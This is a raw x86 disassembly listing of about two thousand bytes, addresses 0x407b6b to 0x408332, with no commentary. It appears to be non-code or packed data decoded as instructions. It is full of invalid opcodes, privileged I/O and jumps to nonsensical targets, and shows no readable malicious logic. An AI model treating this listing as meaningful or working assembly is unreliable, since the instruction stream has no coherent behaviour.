  407b6b:	jae    0x407b4b
  407b6d:	xchg   esi,eax
  407b6e:	jb     0x407bbc
  407b70:	outs   dx,DWORD PTR ds:[esi]
  407b71:	retf   0x925b
  407b74:	pop    ss
  407b75:	pop    eax
  407b76:	push   eax
  407b77:	fmulp  st(6),st
  407b79:	aad    0xed
  407b7b:	test   DWORD PTR [ebx+0x3d3a1fc6],eax
  407b81:	dec    esi
  407b83:	mov    bl,0xfb
  407b85:	es jmp 0xbfa7166c
  407b8b:	data16 (bad) 
  407b8e:	dec    esp
  407b8f:	outs   dx,BYTE PTR ds:[esi]
  407b90:	adc    ebx,DWORD PTR [eax]
  407b92:	dec    ebp
  407b93:	pop    ebp
  407b94:	mul    BYTE PTR [edx+0x43]
  407b97:	add    DWORD PTR [ecx],0x4b
  407b9a:	mov    cl,0x90
  407b9c:	aas    
  407b9d:	das    
  407b9e:	or     dh,BYTE PTR [eax+0x38e5d1ab]
  407ba4:	dec    esp
  407ba5:	es je  0x407b2c
  407ba8:	jmp    0x34fb:0x3f296305
  407baf:	ror    DWORD PTR [ebx+0x41],1
  407bb2:	push   0x3e
  407bb4:	add    esp,esi
  407bb6:	cld    
  407bb7:	adc    eax,0x58d8d8ad
  407bbc:	leave  
  407bbd:	out    0x6f,al
  407bbf:	loope  0x407b73
  407bc1:	shl    DWORD PTR [ebp+0x3e],1
  407bc4:	jbe    0x407bc6
  407bc6:	pop    ebx
  407bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bc8:	stos   DWORD PTR es:[edi],eax
  407bc9:	jmp    0x203ebda4
  407bce:	dec    ebp
  407bcf:	xor    eax,0x5845104
  407bd4:	dec    eax
  407bd5:	fucomp st(5)
  407bd7:	rcl    DWORD PTR [eax+0x3f8a6a1a],1
  407bdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bde:	mov    eax,ds:0x50e4fa1e
  407be3:	jne    0x407c1b
  407be5:	arpl   WORD PTR [edx],bx
  407be7:	dec    edi
  407be8:	pop    ecx
  407be9:	aaa    
  407bea:	(bad)  
  407beb:	fwait
  407bec:	aas    
  407bed:	and    eax,0xf38702b9
  407bf2:	and    dh,al
  407bf4:	add    ah,bh
  407bf6:	ds aas 
  407bf8:	sub    al,dh
  407bfa:	mov    bp,WORD PTR [eax+0x24b10eec]
  407c01:	and    DWORD PTR [edx+edx*4-0x6c],edx
  407c05:	mov    es,WORD PTR [ebp-0x24506541]
  407c0b:	retf   
  407c0c:	js     0x407bd4
  407c0e:	cwde   
  407c0f:	sti    
  407c10:	pcmpeqb mm3,QWORD PTR [edx+0xb]
  407c14:	cs or  al,0x6c
  407c17:	adc    bl,ah
  407c19:	inc    edx
  407c1a:	mov    edx,0x5d84236e
  407c1f:	xor    ch,BYTE PTR [ecx-0x23ea40c9]
  407c25:	out    0x96,al
  407c27:	pop    eax
  407c28:	xor    eax,0xb7db998f
  407c2d:	xchg   esi,eax
  407c2e:	pop    esp
  407c2f:	fdivr  QWORD PTR [esi]
  407c31:	popf   
  407c32:	mov    al,0x26
  407c34:	adc    edi,DWORD PTR [ebp+0x62]
  407c37:	adc    eax,0x9aae4fd
  407c3c:	lahf   
  407c3d:	sbb    DWORD PTR [edx+0x5b6fcaac],esp
  407c43:	xlat   BYTE PTR ds:[ebx]
  407c44:	aas    
  407c45:	push   ebp
  407c46:	shl    BYTE PTR [ebp-0x1ef97821],0xda
  407c4d:	fcomp  DWORD PTR [eax-0x47]
  407c50:	fstp   TBYTE PTR cs:[bp+si+0x9f3]
  407c56:	push   cs
  407c57:	cli    
  407c58:	sub    eax,0x6dbf673b
  407c5d:	out    0xae,al
  407c5f:	ret    
  407c60:	ret    0xd807
  407c63:	les    esi,FWORD PTR [esp+esi*2-0x64]
  407c67:	mul    BYTE PTR [ecx]
  407c69:	push   eax
  407c6a:	push   eax
  407c6b:	dec    edi
  407c6c:	sbb    dl,BYTE PTR [esi-0x22e07b83]
  407c72:	jb     0x407c72
  407c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c75:	int    0x5a
  407c77:	mov    BYTE PTR [esi],ah
  407c79:	mov    esi,0xecbc69c7
  407c7e:	and    al,BYTE PTR [eax+edi*4+0x3e26b0e2]
  407c85:	mov    ecx,0x82a560c5
  407c8a:	icebp  
  407c8b:	js     0x407c50
  407c8d:	out    0xa4,eax
  407c8f:	cs fwait
  407c91:	xchg   DWORD PTR [eax+0x18],ebp
  407c94:	dec    ebx
  407c95:	(bad)  
  407c96:	adc    ecx,DWORD PTR [ebx+ecx*8]
  407c99:	fcomp  QWORD PTR [edx-0x2a]
  407c9c:	mov    bl,0x30
  407c9e:	call   0xc8e334c
  407ca3:	mov    cl,BYTE PTR [edi+eax*1-0xe]
  407ca7:	ss dec ebx
  407ca9:	das    
  407caa:	(bad)  
  407cab:	iret   
  407cac:	ds jnp 0x407c4f
  407caf:	test   al,0xbe
  407cb1:	mov    al,fs:0xf8e93431
  407cb7:	jmp    0x407c9b
  407cb9:	(bad)  
  407cba:	aad    0x5e
  407cbc:	(bad)  
  407cbd:	push   0x1e
  407cbf:	inc    ebp
  407cc0:	ds push ebx
  407cc2:	mov    esi,DWORD PTR [edx-0x150f36c5]
  407cc8:	push   ecx
  407cc9:	out    0xaa,eax
  407ccb:	lahf   
  407ccc:	sti    
  407ccd:	inc    ebx
  407cce:	jb     0x407c57
  407cd0:	mov    al,ds:0xbf53dd28
  407cd5:	sbb    BYTE PTR [ebx+0x6c],bl
  407cd8:	repz ss lock sub al,0xdc
  407cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cde:	mov    al,0x85
  407ce0:	mov    ah,0x72
  407ce2:	push   ds
  407ce3:	sar    DWORD PTR [esi],1
  407ce5:	xchg   edi,eax
  407ce6:	cmp    al,BYTE PTR [ebp-0x6e]
  407ce9:	in     al,0xd9
  407ceb:	add    BYTE PTR [ebx-0x54579525],ah
  407cf1:	adc    al,0xb0
  407cf3:	stos   BYTE PTR es:[edi],al
  407cf4:	cmp    BYTE PTR [eax+0x37b5a65a],bh
  407cfa:	xchg   esi,eax
  407cfb:	mov    eax,ds:0x672be53e
  407d00:	pop    esi
  407d01:	lds    edi,FWORD PTR es:[ebx-0x38]
  407d05:	out    0xe6,al
  407d07:	retf   
  407d08:	int    0xa0
  407d0a:	fnsave [ebx-0x7dc0d591]
  407d10:	sub    eax,0xea4045c7
  407d15:	pushf  
  407d16:	push   eax
  407d17:	test   BYTE PTR [esi-0x3d1bee79],dl
  407d1d:	add    al,0xda
  407d1f:	test   ecx,eax
  407d21:	lock xchg ecx,edx
  407d24:	aas    
  407d25:	in     eax,0x93
  407d27:	pop    edx
  407d28:	retf   
  407d29:	adc    DWORD PTR [ecx-0x26],edx
  407d2c:	or     ah,dh
  407d2e:	or     bh,al
  407d30:	and    edx,eax
  407d32:	shr    DWORD PTR [eax],cl
  407d34:	cmp    BYTE PTR [edi],bh
  407d36:	mov    dl,0x20
  407d38:	sub    eax,DWORD PTR [ebx+0x12]
  407d3b:	loop   0x407ce9
  407d3d:	comiss xmm1,DWORD PTR [edx-0x19b78141]
  407d44:	mov    ah,dh
  407d46:	or     bh,BYTE PTR cs:[ebx-0x71]
  407d4a:	popa   
  407d4b:	add    eax,edi
  407d4d:	mov    ebx,DWORD PTR [esi]
  407d4f:	xchg   ebx,eax
  407d50:	ins    BYTE PTR es:[edi],dx
  407d51:	pop    esi
  407d52:	pop    ebx
  407d53:	xor    BYTE PTR fs:[ecx],0x53
  407d57:	jg     0x407dbd
  407d59:	pop    ebx
  407d5a:	cmp    eax,0xd3b376a9
  407d5f:	test   ch,dl
  407d61:	dec    eax
  407d62:	sar    DWORD PTR [edi+edx*1-0x13bba639],0xc4
  407d6a:	(bad)  
  407d6b:	aas    
  407d6c:	mov    ecx,0xab5fcc9
  407d71:	xlat   BYTE PTR ds:[ebx]
  407d72:	imul   eax,DWORD PTR [ebp-0x1af5b923],0x34ce5d38
  407d7c:	xor    edi,esi
  407d7e:	sbb    al,0x7a
  407d80:	cli    
  407d81:	dec    ebp
  407d82:	jo     0x407d09
  407d84:	mov    eax,ds:0x3ec9d42f
  407d89:	cmp    DWORD PTR [esi-0x31],esi
  407d8c:	mov    bh,0x9f
  407d8e:	sub    al,0x81
  407d90:	ret    0x5e5e
  407d93:	outs   dx,BYTE PTR ds:[esi]
  407d94:	(bad)  
  407d95:	out    0xc8,eax
  407d97:	lahf   
  407d98:	xor    BYTE PTR [esp+ebp*2],dh
  407d9b:	jge    0x407d6f
  407d9d:	inc    ebx
  407d9e:	stc    
  407d9f:	scas   eax,DWORD PTR es:[edi]
  407da0:	std    
  407da1:	push   edi
  407da2:	pop    edx
  407da3:	xor    dl,BYTE PTR [ebp+0x4c]
  407da6:	fsubr  DWORD PTR [edx]
  407da8:	xchg   esi,eax
  407da9:	mov    ds:0x232a8252,eax
  407dae:	adc    al,0xcf
  407db0:	popa   
  407db1:	sbb    esi,DWORD PTR [ebx+0x6e475a07]
  407db7:	inc    ebp
  407db8:	cmp    ecx,DWORD PTR [eax]
  407dba:	pop    edx
  407dbb:	mov    ds:0xbdf4c657,al
  407dc0:	xchg   esi,eax
  407dc1:	sti    
  407dc2:	into   
  407dc3:	mov    ecx,DWORD PTR [edi+eax*1+0x3784170d]
  407dca:	sub    al,0x26
  407dcc:	sub    cl,al
  407dce:	dec    ebp
  407dcf:	fadd   DWORD PTR [eax]
  407dd1:	sbb    DWORD PTR [ecx],edx
  407dd3:	test   BYTE PTR [eax+ebx*8+0x20],ah
  407dd7:	xchg   BYTE PTR [edx+0x2df5a89f],bl
  407ddd:	mov    ds:0xa1beba5f,al
  407de2:	add    al,0xe3
  407de4:	mov    eax,ds:0x9708e8b6
  407dea:	les    edx,FWORD PTR [edi+0x39]
  407ded:	out    0xe2,eax
  407def:	nop
  407df0:	icebp  
  407df1:	loop   0x407dc7
  407df3:	push   esi
  407df4:	mul    ecx
  407df6:	xchg   ecx,eax
  407df7:	inc    esp
  407df8:	dec    ecx
  407df9:	std    
  407dfa:	pop    edx
  407dfb:	add    al,al
  407dfd:	aam    0x96
  407dff:	pop    ss
  407e00:	test   al,0xa2
  407e02:	mov    dh,0x1c
  407e04:	mov    eax,0xc3605b35
  407e09:	lds    ecx,FWORD PTR [esi+0x5b20e7f3]
  407e0f:	sub    BYTE PTR [eax-0x59c95212],ah
  407e15:	sbb    DWORD PTR [esi+0x174f8785],edi
  407e1b:	cmp    BYTE PTR [edi],0x7
  407e1e:	mov    al,0x59
  407e20:	jmp    0xd490:0xccf09747
  407e27:	mov    edx,0x31eb963f
  407e2c:	stos   DWORD PTR es:[edi],eax
  407e2d:	or     ecx,DWORD PTR [eax-0x24f4f1a0]
  407e33:	mov    dl,0x76
  407e35:	in     eax,dx
  407e36:	stc    
  407e37:	mov    eax,DWORD PTR [edx+0x63]
  407e3a:	repnz mov edx,0x8542ed49
  407e40:	lahf   
  407e41:	loope  0x407e7a
  407e43:	pop    edx
  407e44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e45:	mov    BYTE PTR [ebx-0x4e],bl
  407e48:	adc    edi,0x27
  407e4b:	sub    eax,0x865499be
  407e50:	icebp  
  407e51:	ret    
  407e52:	retf   
  407e53:	(bad)  
  407e55:	mov    WORD PTR [ecx+0x7c],fs
  407e58:	retf   0x5bae
  407e5b:	ins    BYTE PTR es:[edi],dx
  407e5c:	adc    DWORD PTR [eax],edi
  407e5e:	inc    ebx
  407e5f:	mov    BYTE PTR [esp+esi*2],cl
  407e62:	loopne 0x407de9
  407e64:	jnp    0x407e4b
  407e66:	fs cmp eax,0x2ffe6d3e
  407e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e6d:	stos   BYTE PTR es:[edi],al
  407e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e6f:	mov    eax,ds:0x960a13f4
  407e74:	into   
  407e75:	jnp    0x407dfb
  407e77:	test   DWORD PTR [edx+eiz*8+0x413fc6b3],edi
  407e7e:	xor    ebx,esp
  407e80:	inc    ebx
  407e81:	inc    ebp
  407e82:	aam    0x7f
  407e84:	hlt    
  407e85:	xchg   ebp,eax
  407e86:	or     ah,BYTE PTR [esi+edi*1+0x10afcd00]
  407e8d:	or     ebx,esp
  407e8f:	aaa    
  407e90:	add    eax,0xbeffa82b
  407e95:	jne    0x407ee4
  407e97:	add    bl,dl
  407e99:	data16 jnp 0x407eac
  407e9c:	call   0xcd57:0x688578fe
  407ea3:	sar    BYTE PTR [esi],0x1
  407ea6:	or     al,cl
  407ea8:	scas   al,BYTE PTR es:[edi]
  407ea9:	xor    edx,ebp
  407eab:	jp     0x407ef3
  407ead:	jmp    0x5fd1ebd8
  407eb2:	les    edi,FWORD PTR [ecx-0x5b908db7]
  407eb8:	sbb    ecx,ebp
  407eba:	or     bl,0x3f
  407ebd:	jge    0x407ed8
  407ebf:	pop    ss
  407ec0:	pop    edx
  407ec1:	and    dl,al
  407ec3:	mov    ebx,0x8322a7c0
  407ec8:	cmp    BYTE PTR [edx-0x41],0xe8
  407ecc:	test   BYTE PTR [esi-0x7],cl
  407ecf:	aas    
  407ed0:	and    edx,DWORD PTR [ebx]
  407ed2:	pop    ecx
  407ed3:	jne    0x407eef
  407ed5:	fs jbe 0x407e6e
  407ed8:	mov    edx,0x49d02a3f
  407edd:	out    0xea,eax
  407edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee0:	add    ah,BYTE PTR [ebp+ecx*1-0x4c]
  407ee4:	call   0xb6ce1827
  407ee9:	sbb    bl,BYTE PTR [edx-0x7e]
  407eec:	xor    ebp,DWORD PTR [ebx]
  407eee:	xor    al,0xfd
  407ef0:	and    dh,al
  407ef2:	rol    BYTE PTR [esp+edi*1+0x3fdd256b],1
  407ef9:	(bad)  
  407efa:	ficom  DWORD PTR [ecx]
  407efc:	xchg   edx,eax
  407efd:	popa   
  407efe:	les    esi,FWORD PTR [ebp-0x49]
  407f01:	out    0xde,eax
  407f03:	dec    esi
  407f04:	push   ebp
  407f05:	push   es
  407f06:	cmp    eax,0xf2d2fb1f
  407f0b:	outs   dx,BYTE PTR ds:[esi]
  407f0c:	sbb    edx,eax
  407f0e:	pop    esp
  407f0f:	out    0xba,al
  407f11:	xchg   esp,eax
  407f12:	(bad)  
  407f13:	pop    ebx
  407f14:	lahf   
  407f15:	cmp    bl,BYTE PTR [esp+esi*4-0x1c]
  407f19:	mov    ebp,edi
  407f1b:	xchg   DWORD PTR [edi-0x20379bcd],edx
  407f21:	popa   
  407f22:	mov    cl,0xc
  407f24:	je     0x407ec9
  407f26:	pop    edx
  407f27:	cmp    BYTE PTR [eax],dl
  407f29:	imul   ebp,DWORD PTR [eax+0x42],0xffffffec
  407f2d:	inc    esp
  407f2e:	push   edx
  407f2f:	test   ecx,eax
  407f31:	cwde   
  407f32:	xchg   ebx,eax
  407f33:	retf   0x13e
  407f36:	(bad)  
  407f37:	sbb    BYTE PTR [ebp+0x7b395078],bh
  407f3d:	in     eax,0xa8
  407f3f:	inc    eax
  407f40:	jbe    0x407fa3
  407f42:	push   edi
  407f43:	pop    esi
  407f44:	out    0xa7,al
  407f46:	sub    al,0x43
  407f48:	dec    edi
  407f49:	jg     0x407f6a
  407f4b:	(bad)  
  407f4c:	lock out 0x7,al
  407f4f:	std    
  407f50:	jge    0x407ef2
  407f52:	sub    DWORD PTR [edi],0x72
  407f55:	out    0x92,al
  407f57:	nop
  407f58:	mov    esp,0x81784d09
  407f5d:	inc    esp
  407f5e:	rcr    esp,cl
  407f60:	mov    al,0x6c
  407f62:	pop    ebx
  407f63:	pop    esi
  407f64:	sub    esi,edx
  407f66:	fcmovu st,st(0)
  407f68:	outs   dx,BYTE PTR ds:[esi]
  407f69:	jno    0x407f3d
  407f6b:	fwait
  407f6c:	mov    edi,0xe34d69a7
  407f71:	ret    
  407f72:	xor    al,0x83
  407f74:	mov    edx,0x4125c9e5
  407f79:	fwait
  407f7a:	jmp    0x2f17:0x92fbf0cc
  407f81:	adc    bh,dh
  407f83:	sti    
  407f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f85:	and    BYTE PTR [ebp-0x26],bl
  407f88:	mov    ebx,0xdd733ac4
  407f8d:	push   edi
  407f8e:	push   esp
  407f8f:	dec    esi
  407f90:	(bad)  
  407f91:	jmp    0x23d4:0xf9298d2e
  407f98:	jne    0x407f95
  407f9a:	mov    ah,0x91
  407f9c:	call   DWORD PTR [edx+0x7]
  407f9f:	mov    al,ds:0x4d20da3e
  407fa4:	aas    
  407fa5:	pop    ebx
  407fa6:	test   al,0xe0
  407fa8:	aad    0x2c
  407faa:	es jb  0x408013
  407fad:	push   ss
  407fae:	mov    edi,0x816b48f6
  407fb3:	mov    esi,0x841e2a82
  407fb8:	cmp    al,0x92
  407fba:	cli    
  407fbb:	add    BYTE PTR [esi+0x63d25460],bh
  407fc1:	out    0x5e,eax
  407fc3:	lea    ecx,[ebx+0xc3d62b8]
  407fc9:	pop    ds
  407fca:	pop    esi
  407fcb:	test   BYTE PTR [ebx],ch
  407fcd:	pushf  
  407fce:	cld    
  407fcf:	idiv   DWORD PTR [edi]
  407fd1:	adc    DWORD PTR [eax-0x69],ebp
  407fd4:	xlat   BYTE PTR ds:[ebx]
  407fd5:	std    
  407fd6:	cmp    al,0x71
  407fd8:	scas   al,BYTE PTR es:[edi]
  407fd9:	loopne 0x40802d
  407fdb:	mov    esp,DWORD PTR [eax+0x6]
  407fde:	test   BYTE PTR [eax],al
  407fe0:	jge    0x408034
  407fe2:	dec    esi
  407fe3:	(bad)  
  407fe4:	push   ecx
  407fe5:	push   edi
  407fe6:	inc    ebp
  407fe7:	gs dec eax
  407fe9:	aad    0x98
  407feb:	gs dec ebx
  407fed:	dec    ebp
  407fee:	pop    ebx
  407fef:	mov    edx,0xa687dbf8
  407ff4:	adc    BYTE PTR [edi],cl
  407ff6:	les    eax,FWORD PTR [ebp+0x20beff64]
  407ffc:	pop    ds
  407ffd:	lods   al,BYTE PTR ds:[esi]
  407ffe:	adc    al,0xf
  408000:	aas    
  408001:	sub    edi,DWORD PTR [edx+0x6f]
  408004:	mov    BYTE PTR [ebx+ebp*4],ch
  408007:	pop    esp
  408008:	mov    ecx,0xe4dfa8e7
  40800d:	sbb    ebx,DWORD PTR [eax+0x76ca9323]
  408013:	ror    DWORD PTR [edi+0x10065815],0xdb
  40801a:	retf   
  40801b:	fcom   QWORD PTR [eax-0x19]
  40801e:	add    BYTE PTR [ebx-0x1c4a5696],0x52
  408025:	stos   DWORD PTR es:[edi],eax
  408026:	in     eax,0x7e
  408028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408029:	dec    edi
  40802a:	mov    ebp,0x63e4145a
  40802f:	test   DWORD PTR [ebp+0x46],ecx
  408032:	lods   eax,DWORD PTR ds:[esi]
  408033:	cmp    cl,BYTE PTR [edx-0x11]
  408036:	imul   eax,DWORD PTR [edi+0x1a17fb30],0x6c9d4b7d
  408040:	mul    BYTE PTR [ecx+0x24f9fa61]
  408046:	pop    esp
  408047:	sbb    eax,DWORD PTR [bp+di+0x446c]
  40804c:	es aaa 
  40804e:	mov    esp,0x72abaa84
  408053:	adc    al,0x3e
  408055:	not    eax
  408057:	cmp    cl,al
  408059:	adc    DWORD PTR ds:0xcee6bf2c,0xbb9055db
  408063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408064:	mov    eax,0x629ea18e
  408069:	add    ebx,DWORD PTR [eax-0x72]
  40806c:	jmp    0x293caf4
  408071:	call   0xa15eb250
  408076:	and    BYTE PTR ds:0x4d6ab86,0x3f
  40807d:	das    
  40807e:	sar    edi,1
  408080:	pop    ecx
  408081:	xchg   ebp,eax
  408082:	cmc    
  408083:	or     ebp,ecx
  408085:	out    0x72,al
  408087:	mov    cl,0xd8
  408089:	mov    ebp,0x9ae47a5c
  40808e:	mov    dl,0xe4
  408090:	stos   BYTE PTR es:[edi],al
  408091:	lock pop ebx
  408093:	fsub   DWORD PTR [edx+0x8]
  408096:	(bad)  
  408097:	mov    eax,0x9a9351b2
  40809c:	mov    esi,0x16ace7c0
  4080a1:	out    dx,al
  4080a2:	mov    esi,0x5a9bbe24
  4080a7:	cmp    ah,BYTE PTR [ebx]
  4080a9:	xor    ebp,DWORD PTR [ebx-0x17]
  4080ac:	add    al,0x23
  4080ae:	outs   dx,DWORD PTR ds:[esi]
  4080af:	test   esi,edi
  4080b1:	inc    edx
  4080b2:	jmp    0xd174:0x77533e9e
  4080b9:	jnp    0x4080dc
  4080bb:	(bad)  
  4080bc:	mov    ah,0xe7
  4080be:	into   
  4080bf:	or     DWORD PTR [ecx-0x39],0xdb2a8097
  4080c6:	sbb    dl,cl
  4080c8:	pop    edx
  4080c9:	fs pop ebx
  4080cb:	mov    al,0x67
  4080cd:	fdiv   st,st(2)
  4080cf:	or     BYTE PTR [eax+0x45],ch
  4080d2:	mov    edi,0xba2dc3b9
  4080d7:	test   DWORD PTR [ebx+0x46bb1338],edi
  4080dd:	add    DWORD PTR [edx+0x23bea7bd],edi
  4080e3:	test   DWORD PTR [eax+0x64544126],ecx
  4080e9:	out    dx,eax
  4080ea:	mov    ds:0xe546bc24,eax
  4080ef:	stos   DWORD PTR es:[edi],eax
  4080f0:	mov    esi,0xffbc477b
  4080f5:	dec    esp
  4080f6:	xor    ah,BYTE PTR [esi-0x73055078]
  4080fc:	xor    DWORD PTR [edi-0x1d089a5],esi
  408102:	xchg   ebx,eax
  408103:	in     al,0x5a
  408105:	out    0xe6,al
  408107:	jb     0x40817f
  408109:	xor    al,0x48
  40810b:	xor    al,0x8a
  40810d:	jmp    0x91aeee77
  408112:	pop    edx
  408113:	mov    BYTE PTR [edi+0x2f],cl
  408116:	scas   eax,DWORD PTR es:[edi]
  408117:	mov    eax,0x84dd7726
  40811c:	retf   0x6c72
  40811f:	and    al,0x3f
  408121:	fldln2 
  408123:	xchg   esp,eax
  408124:	lock lahf 
  408126:	stos   DWORD PTR es:[edi],eax
  408127:	or     eax,0x6540e6e8
  40812c:	or     edi,edi
  40812e:	pop    ss
  40812f:	sub    dh,al
  408131:	rol    BYTE PTR [ebx+0x5a73682f],1
  408137:	call   0x3a62f032
  40813c:	pop    esi
  40813d:	or     bl,BYTE PTR [esi-0x65cdc17b]
  408143:	push   esi
  408144:	rol    BYTE PTR [ebp+edx*1-0x59],cl
  408148:	rcr    BYTE PTR [edi+0x655f8074],0x5b
  40814f:	dec    eax
  408150:	sbb    BYTE PTR [edi+eiz*1],0x68
  408154:	fsubrp st(6),st
  408156:	mov    edx,0xd246a967
  40815b:	or     bl,BYTE PTR [ebx+0x7c]
  40815e:	std    
  40815f:	push   ecx
  408160:	repz loop 0x40811a
  408163:	mov    dl,0xec
  408165:	jmp    0x5dc4:0xe86a5a5a
  40816c:	jge    0x4081ad
  40816e:	mov    edi,0x8e61c449
  408173:	test   al,bl
  408175:	(bad)  
  408176:	das    
  408177:	cdq    
  408178:	cmp    eax,0x57c8df2f
  40817d:	pop    es
  40817e:	imul   ebp,DWORD PTR [ebp-0x1a],0x22
  408182:	rcl    DWORD PTR [ecx+0xab52953],cl
  408188:	sub    eax,0x1403f98e
  40818d:	jns    0x4081b9
  40818f:	rol    ecx,0xe4
  408192:	pop    edx
  408193:	(bad)  
  408194:	dec    eax
  408195:	pop    edi
  408196:	test   al,0x77
  408198:	push   esp
  408199:	cmp    ebx,DWORD PTR [edx]
  40819b:	test   DWORD PTR [edi],esi
  40819d:	mov    ah,0x15
  40819f:	add    edi,DWORD PTR [esi]
  4081a1:	and    eax,0x1aad7cd5
  4081a6:	ror    DWORD PTR [edi-0x55011824],1
  4081ac:	push   esp
  4081ad:	sub    DWORD PTR [edx-0xaf5f0bf],ecx
  4081b3:	loopne 0x4081eb
  4081b5:	jecxz  0x408214
  4081b7:	adc    dh,al
  4081b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081ba:	xor    esi,DWORD PTR [ebp+0x20]
  4081bd:	out    0xa,eax
  4081bf:	fdivr  QWORD PTR [eax]
  4081c1:	jns    0x408237
  4081c3:	jmp    DWORD PTR [ecx-0x63d746d6]
  4081c9:	cmp    bl,0x68
  4081cc:	pop    ss
  4081cd:	fistp  WORD PTR [edi-0x7e]
  4081d0:	in     eax,0xe6
  4081d2:	popf   
  4081d3:	repz mov esi,0x1ec974da
  4081d9:	les    ebx,FWORD PTR [eax]
  4081db:	xchg   dl,dh
  4081dd:	push   ebx
  4081de:	pusha  
  4081df:	xor    esp,DWORD PTR [ebx-0x78beb80]
  4081e5:	out    0x2d,al
  4081e7:	mov    dl,0xa5
  4081e9:	jmp    0x408210
  4081eb:	ret    0xe637
  4081ee:	in     al,0x50
  4081f0:	adc    al,0xc9
  4081f2:	mov    eax,ds:0x377ae09d
  4081f7:	test   eax,0xcc6a7709
  4081fc:	xlat   BYTE PTR ds:[ebx]
  4081fd:	out    0xa2,al
  4081ff:	sar    BYTE PTR [edx+0x41],1
  408202:	adc    BYTE PTR [ebx+edi*8],dh
  408205:	push   0x2fedc109
  40820a:	pop    edx
  40820b:	cmp    BYTE PTR [ebx+0x107b7bce],cl
  408211:	test   eax,0xa5e58564
  408216:	jmp    0x643a:0x7693e28
  40821d:	pop    ecx
  40821e:	xchg   ebp,eax
  40821f:	std    
  408220:	hlt    
  408221:	out    0xde,al
  408223:	adc    edi,DWORD PTR [ebp-0x44]
  408226:	imul   ecx,edx,0x4a
  408229:	nop
  40822a:	xor    eax,0x5bd3b19b
  40822f:	jbe    0x4081b9
  408231:	in     eax,dx
  408232:	aas    
  408233:	push   esi
  408234:	sti    
  408235:	out    0x66,eax
  408237:	ins    DWORD PTR es:[edi],dx
  408238:	mov    dh,0x9f
  40823a:	shr    edx,0x65
  40823d:	test   al,0xf2
  40823f:	or     eax,0x38ae1b00
  408244:	lods   eax,DWORD PTR ds:[esi]
  408246:	pushf  
  408247:	neg    BYTE PTR [ebx+eiz*8-0x2]
  40824b:	jbe    0x40825d
  40824d:	mov    ch,0x2c
  40824f:	test   BYTE PTR [ebx-0x59],bh
  408252:	stc    
  408253:	adc    eax,0x40c0033f
  408258:	stos   DWORD PTR es:[edi],eax
  408259:	and    al,0x8e
  40825b:	rcr    BYTE PTR [ecx-0x3e],1
  40825e:	xchg   esi,eax
  40825f:	or     eax,0x40aae75e
  408264:	push   ds
  408265:	jno    0x4081f0
  408267:	pop    ebp
  408268:	ds dec ecx
  40826a:	test   eax,0xc8076757
  40826f:	cdq    
  408270:	push   0xffffffe6
  408272:	push   0x73
  408274:	pop    ecx
  408275:	les    edx,FWORD PTR [ecx]
  408277:	stos   DWORD PTR es:[edi],eax
  408278:	cmp    dl,BYTE PTR [edi-0x67]
  40827b:	jge    0x408247
  40827d:	imul   ebx,DWORD PTR [ebx-0x4e],0xffffff9d
  408281:	dec    ebx
  408282:	adc    DWORD PTR [eax+esi*1],ebx
  408285:	or     BYTE PTR [edi],ch
  408287:	mov    edx,0x50d230f
  40828c:	fdiv   DWORD PTR [edi-0x2c82cb10]
  408292:	pop    edx
  408293:	adc    BYTE PTR [edi],al
  408295:	mov    bh,BYTE PTR [esi-0x304cb5fc]
  40829b:	cmp    BYTE PTR [ecx-0x15],0x6c
  40829f:	in     eax,dx
  4082a0:	mov    edx,0xa2158b5b
  4082a5:	push   ebx
  4082a6:	pop    edx
  4082a7:	jo     0x4082de
  4082a9:	jne    0x4082e3
  4082ab:	fwait
  4082ac:	(bad)  
  4082ad:	out    0x7a,al
  4082af:	push   0xb
  4082b1:	int3   
  4082b2:	sub    esp,DWORD PTR [esi+0x59]
  4082b5:	and    eax,0xe52fb815
  4082ba:	pop    ebx
  4082bb:	mov    dh,0x8f
  4082bd:	xor    BYTE PTR [ebx-0x3d],dl
  4082c0:	mov    dl,0x55
  4082c2:	(bad)
  4082c5:	fwait
  4082c6:	pop    ebp
  4082c7:	jmp    0xa2387e05
  4082cc:	pusha  
  4082cd:	pop    es
  4082ce:	push   0xa9496575
  4082d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082d4:	cmp    al,0xec
  4082d6:	in     eax,0x84
  4082d8:	or     DWORD PTR [eax+0x753e53b5],ecx
  4082de:	mov    ds:0x43ebd606,al
  4082e3:	out    0x3d,al
  4082e5:	out    0xdc,eax
  4082e7:	es stc 
  4082e9:	pop    ecx
  4082ea:	xchg   ebp,eax
  4082eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082ec:	imul   cx,WORD PTR [edx],0x48
  4082f0:	mov    esi,0xaf405bc0
  4082f5:	jg     0x4082aa
  4082f7:	arpl   WORD PTR [edx],di
  4082f9:	aaa    
  4082fa:	pop    ss
  4082fb:	fwait
  4082fc:	jle    0x40828c
  4082fe:	cmp    bl,dl
  408300:	das    
  408301:	rcl    DWORD PTR [ebp+ebx*4-0x4b],0xf8
  408306:	pop    edx
  408307:	in     al,dx
  408308:	test   al,0x54
  40830a:	pop    ecx
  40830b:	adc    al,0x90
  40830d:	jmp    0x32c1:0x8e3f92b8
  408314:	pusha  
  408315:	and    al,0xe5
  408317:	xchg   edx,eax
  408318:	fcom   QWORD PTR [eax-0x296933a3]
  40831e:	push   edi
  40831f:	call   FWORD PTR [eax]
  408321:	out    0x4a,al
  408323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408324:	or     al,ah
  408326:	mov    ecx,0x446c8fb8
  40832b:	retf   
  40832c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40832d:	xchg   BYTE PTR [edx+0x14],bl
  408330:	push   edx
  408331:	pushf  
  408332:	mov    bl,0x6b
